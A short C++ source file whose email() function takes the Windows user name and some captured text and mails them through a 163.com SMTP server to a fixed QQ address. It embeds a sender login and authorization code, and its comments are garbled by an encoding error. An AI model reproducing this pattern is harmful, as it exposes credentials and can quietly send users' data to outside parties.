#include "Smtp.h"
#include "include/API.h"

void email() {
	string a;
	a = windows_user_name_noreturn();
	string text_email_secoen = text_box_auto();

	CSmtp smtp(
		25,								//smtp�˿�
		"smtp.163.com",					//smtp��������ַ
		"zhu1725212799@163.com",	//�����ַ
		"AWPLAIAJEPAACNCL",					//��������
		"1725212799@qq.com",	//Ŀ�������ַ
		a,							//
	   //"���������:%c����Ϣ"		//�ʼ�����
		text_email_secoen

	);

	//��Ӹ���ʱע��,\һ��Ҫд��\\����Ϊת���ַ���Ե��
	/*string filePath("C:\\Users\\ASUS\\Desktop\\�̳�\\JAVA���-��.xmind");
	smtp.AddAttachment(filePath);*/


	//�����Ե���CSmtp::DeleteAttachment����ɾ������������һЩ�������Լ���ͷ�ļ���!
	//filePath = "C:\\Users\\TEXT\\Desktop\\sendEmail.cpp";
	//smtp.AddAttachment(filePath);

	int err;
	if ((err = smtp.SendEmail_Ex()) != 0)
	{
		if (err == 1)
			cout << "����1: �������粻��ͨ������ʧ��!" << endl;
		if (err == 2)
			cout << "����2: �û�������,��˶�!" << endl;
		if (err == 3)
			cout << "����3: �û����������˶�!" << endl;
		if (err == 4)
			cout << "����4: ���鸽��Ŀ¼�Ƿ���ȷ���Լ��ļ��Ƿ����!" << endl;
	}
	system("pause");

}
